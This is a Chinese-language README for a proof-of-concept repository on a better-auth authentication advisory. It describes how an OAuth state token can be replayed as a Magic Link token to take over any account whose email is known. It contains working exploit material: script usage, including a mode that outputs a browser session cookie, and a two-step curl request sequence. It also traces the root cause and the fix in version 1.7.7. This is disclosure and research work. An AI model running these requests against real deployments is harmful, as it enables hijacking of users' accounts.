# better-auth GHSA-965c-763c-88jm

[English README](./README.md)

OAuth State 与 Magic Link Token 用途混淆，导致任意账号接管。攻击者只需知道受害者邮箱，即可在不接触邮箱、不完成任何 OAuth 授权的情况下拿到完整会话。

[![Advisory](https://img.shields.io/badge/GHSA-965c--763c--88jm-red)](https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

| 项目 | 内容 |
| --- | --- |
| 公告 | [GHSA-965c-763c-88jm](https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm) |
| 组件 | better-auth（npm） |
| 受影响版本 | `>= 1.4.0-beta.18`，`< 1.7.7` |
| 分析版本 | 1.7.6 |
| 修复版本 | 1.7.7（Purpose-isolation，[PR #11494](https://github.com/better-auth/better-auth/pull/11494)） |
| 类型 | 认证不当 / 会话伪造（CWE-287） |

## 免责声明

仅用于**授权的安全测试与教学**。禁止对未获书面授权的系统使用本脚本。该漏洞已公开并已修复，受影响部署请升级到 better-auth **1.7.7 或更高版本**。

## 触发条件

需同时满足：

1. 启用 Magic Link 插件（默认 `storeToken: "plain"`，或 `hashed` 且 `verification.storeIdentifier: "hashed"`）
2. 启用至少一个社交登录或 Generic OAuth 提供方
3. OAuth state 采用数据库存储（配置了数据库或 secondaryStorage 时默认为 `database`；cookie 策略不受此漏洞影响）

## 快速开始

Python 3.8+，仅标准库，无需 `pip install`。

```bash
python3 betterauth_poc.py -t http://127.0.0.1:8080 -e victim@example.com -p github
```

Cookie 模式（输出可粘进浏览器的会话 Cookie）：

```bash
python3 betterauth_poc.py -t https://sso.example.com --cookie -e victim@example.com -p google
```

脚本：[betterauth_poc.py](./betterauth_poc.py)

### 参数

```
python3 betterauth_poc.py -t <基址> [选项]
```

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `-t` / `--target` | （必填） | 目标基址，如 `http://10.0.0.1:8080` |
| `-e` / `--email` | `victim@example.com` | 要接管的账号邮箱 |
| `-p` / `--provider` | `github` | 已启用的 OAuth 提供方 ID（内置如 `github`/`google`；generic-oauth 为自定义 `providerId`） |
| `--base-path` | `/api/auth` | better-auth API 基础路径 |
| `--name` | `poc` | `additionalData` 中的 name（占位） |
| `--cookie` | 关闭 | 跟随 302 打印 `better-auth.session_token`；默认返回 JSON 会话凭据 |
| `--callback` | `/app` | Cookie 模式下的跳转地址 |
| `-k` / `--insecure` | 关闭 | 跳过 TLS 证书校验 |
| `--timeout` | `15` | 请求超时秒数 |

自定义 API 路径：`--base-path /auth`。自签证书：`-k`。Generic OAuth：`-p my-sso`。完整帮助：`python3 betterauth_poc.py -h`。

**退出码：** `0` 成功（JSON 模式下 `user.email` 与 `-e` 一致；Cookie 模式拿到 `better-auth.session_token`）· `1` 已签发会话但邮箱不一致 · `2` 请求失败。

| 现象 | 常见原因 |
| --- | --- |
| HTTP 429 | 限流，稍后再试 |
| `PROVIDER_NOT_FOUND` | `-p` 与目标配置不一致；generic-oauth 用自定义 `providerId` |
| 响应 url 中无 `state` | 目标不是 better-auth，或 `--base-path` 不正确 |
| `INVALID_TOKEN` | Magic Link 未启用；state 过期（10 分钟）或已被消费；目标已升级到 1.7.7+ |
| Cookie 模式未拿到会话 | 自定义了 `cookiePrefix`；改用默认 JSON 模式读取 `token` |

### 脚本步骤

1. `POST {base-path}/sign-in/social`，`disableRedirect: true`，`additionalData.email` 为受害者邮箱。
2. 从响应 `url` 取出 `state`（无需在 IdP 登录，state 已在跳转前落库）。
3. JSON 模式：`GET {base-path}/magic-link/verify?token={state}`，解析 `{token, user, session}`。
4. Cookie 模式：同样请求并附带 `callbackURL`，禁止跟随重定向，从 `Set-Cookie` 提取 `better-auth.session_token`。

## 最小请求序列

```bash
# 1. 发起 OAuth 登录并把受害者邮箱注入 additionalData
curl -s -X POST http://target/api/auth/sign-in/social \
  -H 'Content-Type: application/json' \
  -d '{"provider":"<provider>","callbackURL":"/","disableRedirect":true,
       "additionalData":{"email":"victim@example.com","name":"x"}}'
# 响应：{"url":"https://...?...&state=<STATE>...","redirect":false}

# 2. 将 state 作为 Magic Link 令牌提交
#    不带 callbackURL：返回 JSON {token, user, session}
curl -s 'http://target/api/auth/magic-link/verify?token=<STATE>' \
  -H 'Origin: http://target'

#    带 callbackURL：302 + Set-Cookie
curl -i 'http://target/api/auth/magic-link/verify?token=<STATE>&callbackURL=/app' \
  -H 'Origin: http://target'
```

全局 origin 中间件对 GET 直接放行；端点级 originCheck 仅校验 `callbackURL` 等跳转地址是否受信，相对路径默认可通过。

## 根因

better-auth 把两类语义完全不同的一次性凭据存进同一张 `verification` 表，并且都以随机串作为 `identifier`：

| 记录类型 | identifier | value |
| --- | --- | --- |
| Magic Link 令牌 | `token` | `JSON({email, name})` |
| OAuth state | `state` | `JSON({…additionalData, callbackURL, codeVerifier, link, oauthState…})` |

校验侧 `consumeVerificationValue` 只按 `identifier` 查表，不校验记录用途。于是 OAuth state 记录可以冒充 Magic Link 令牌被消费。

`POST /sign-in/social` 允许通过请求体 `additionalData` 向 state 记录的 `value` JSON 顶层注入任意键值（包括 `email`）。Magic Link 校验逻辑又从 `value` JSON 中解构 `email` 来决定给谁签发会话。两个子系统各自的设计叠加后形成完整的账号接管链路。

## 代码分析链路（better-auth v1.7.6）

路径均相对仓库根目录 `packages/better-auth/src/`。

### 第一步：发起 OAuth 登录，state 连同注入的 email 落库

**入口：`api/routes/sign-in.ts:197` —— `signInSocial`（POST `/sign-in/social`）**

请求体 schema 允许任意键值对的 `additionalData`：

```ts
// api/routes/sign-in.ts:192
additionalData: z.record(z.string(), z.any()).optional().meta({
    description: "Additional data to be passed through the OAuth flow",
}),
```

处理器将 `additionalData` 原样传给 `generateState`：

```ts
// api/routes/sign-in.ts:376-379
const { codeVerifier, state } = await generateState(c, {
    additionalData: c.body.additionalData,
    idTokenNonce,
});
```

**`oauth2/state.ts:39` —— `generateState` 把 additionalData 展开进 state 数据顶层**

```ts
// oauth2/state.ts:56-69
const stateData: StateData = {
    ...(options?.additionalData ? options.additionalData : {}),   // ← email/name 注入到顶层
    callbackURL,
    codeVerifier,
    errorURL: c.body?.errorCallbackURL,
    newUserURL: c.body?.newUserCallbackURL,
    link: options?.link,
    serverContext,
    expiresAt: Date.now() + 10 * 60 * 1000,
    requestSignUp: c.body?.requestSignUp,
    idTokenNonce: options?.idTokenNonce,
};
```

随后调用 `generateGenericState`：

```ts
// oauth2/state.ts:74
return generateGenericState(c, stateData);
```

**`state.ts:82` —— `generateGenericState` 以 state 为 identifier 写入 verification 表**

```ts
// state.ts:87
const state = generateRandomString(32);

// state.ts:137-144（database 策略，配置数据库/二级存储时为默认）
const verification = await c.context.internalAdapter.createVerificationValue({
    value: JSON.stringify({
        ...stateData,          // ← 含注入的 email
        oauthState: state,
    } satisfies StateData),
    identifier: state,         // ← 与 Magic Link 令牌共用同一命名空间
    expiresAt,
});
```

**回到 `api/routes/sign-in.ts:394-397` —— 响应中返回含 state 的授权跳转 URL**

```ts
// api/routes/sign-in.ts:394-397
return c.json({
    url: url.toString(),       // ← 授权 URL 中含 &state=<随机串>
    redirect: !c.body.disableRedirect,
});
```

从响应 JSON（或 Location 头）即可取到 `state`。此时不需要与 OAuth 提供方发生任何后续交互。state 记录默认 10 分钟过期，且一次性消费。

`additionalData` 注入时，下列键会被 OAuth 流程自身字段覆盖，不能用来改写协议字段：`callbackURL`、`codeVerifier`、`errorURL`、`link`、`serverContext`、`expiresAt`、`requestSignUp`、`idTokenNonce`。`email` / `name` 不在此列，可以注入。

### 第二步：把 state 当作 Magic Link 令牌提交

**入口：`plugins/magic-link/index.ts:298` —— `magicLinkVerify`（GET `/magic-link/verify`）**

```ts
// plugins/magic-link/index.ts:386-390
const storedToken = await storeToken(ctx, token);      // storeToken 默认 "plain"（第 163 行），token 原样返回
const tokenValue =
    await ctx.context.internalAdapter.consumeVerificationValue(
        storedToken,                                    // ← 用 state 查表
    );
if (!tokenValue) {
    redirectWithError("INVALID_TOKEN");
}
```

**`db/internal-adapter.ts:1390` —— `consumeVerificationValue` 仅按 identifier 查表**

```ts
// db/internal-adapter.ts:1390-1392
consumeVerificationValue: async (
    identifier: string,
): Promise<Verification | null> => {

// db/internal-adapter.ts:1452（database 分支）
const where = [{ field: "identifier", value: id }];    // ← 唯一匹配条件，不校验记录用途
```

若仅使用 secondaryStorage（无 SQL verification 表），消费走 `getAndDelete`，同样只按 identifier，不区分用途。

于是第一步写入的 OAuth state 记录被当作 Magic Link 令牌成功消费。

### 第三步：从 value 中解构注入的 email，为该邮箱签发会话

```ts
// plugins/magic-link/index.ts:394-397
const { email, name } = JSON.parse(tokenValue.value) as {
    email: string;                                       // ← 来自 additionalData 的受害者邮箱
    name?: string | undefined;
};

// plugins/magic-link/index.ts:400-402
let user = await ctx.context.internalAdapter
    .findUserByEmail(email)                              // ← 命中已存在的受害者账号
    .then((res) => res?.user);
```

后续与正常 Magic Link 登录完全一致：

```ts
// plugins/magic-link/index.ts:447-449
const session = await ctx.context.internalAdapter.createSession(
    user.id,                                             // ← 受害者的会话
);

// plugins/magic-link/index.ts:455-458
await setSessionCookie(ctx, {
    session,
    user,
});

// plugins/magic-link/index.ts:459-464（未携带 callbackURL 时直接返回 JSON 会话）
if (!ctx.query.callbackURL) {
    return ctx.json({
        token: session.token,
        user: parseUserOutput(ctx.context.options, user),
        session: parseSessionOutput(ctx.context.options, session),
    });
}
```

若受害者邮箱在系统中不存在且 Magic Link 允许注册，则会以“已验证邮箱”标记创建新账号。

### 调用关系（摘要）

```
POST /sign-in/social
  └─ additionalData: { email: victim }
       └─ generateState()            oauth2/state.ts
            └─ generateGenericState()
                 └─ createVerificationValue({
                      identifier: <random-state>,
                      value: JSON({ email, …oauth fields })
                    })
       └─ 响应 { url: "...&state=<random-state>" }

GET /magic-link/verify?token=<random-state>
  └─ storeToken() 默认 plain，原样返回
       └─ consumeVerificationValue(identifier)   不校验用途
            └─ JSON.parse(value).email
                 └─ findUserByEmail / createUser
                      └─ createSession + setSessionCookie
                           └─ JSON { token, user, session }
                              或 302 + Set-Cookie
```

## 修复（v1.7.7）

```bash
git diff v1.7.6 v1.7.7 -- \
  packages/better-auth/src/plugins/magic-link/index.ts \
  packages/better-auth/src/state.ts
```

1. **标识命名空间隔离**：Magic Link 记录的 identifier 变为 `magic-link:${storedToken}`，OAuth state 记录的 identifier 变为 `auth-state:${state}`（`getAuthStateVerificationIdentifier`），两类记录在存储层面不再可能冲突。
2. **载荷类型校验**：verify 侧先经 `findVerificationValue` 预检记录形状，不匹配时直接拒绝且不消费对方记录；原子消费成功后，`value` JSON 还必须满足 `{type: "magic-link", email, name?}` 的严格 schema（`.strict()` + `z.email()`），OAuth state 记录因结构不符会被拒绝。
3. **加密密钥用途隔离**：新增 `crypto/purpose.ts` 的 `derivePurposeKey`（HKDF-SHA256），cookie 策略下的 state 加密以及各 OAuth Proxy 载荷改为按用途派生互不相同的密钥。

升级后，旧 Magic Link 与旧 OAuth state 记录均无法再完成验证；自定义 `verification.storeIdentifier.overrides` 等规则需适配 `magic-link:` 与 `auth-state:` 前缀。

## 参考

- 官方公告：https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm
- 修复 PR：https://github.com/better-auth/better-auth/pull/11494
- 派生键实现：`packages/better-auth/src/crypto/purpose.ts`（v1.7.7）

## 许可证

[MIT](LICENSE)
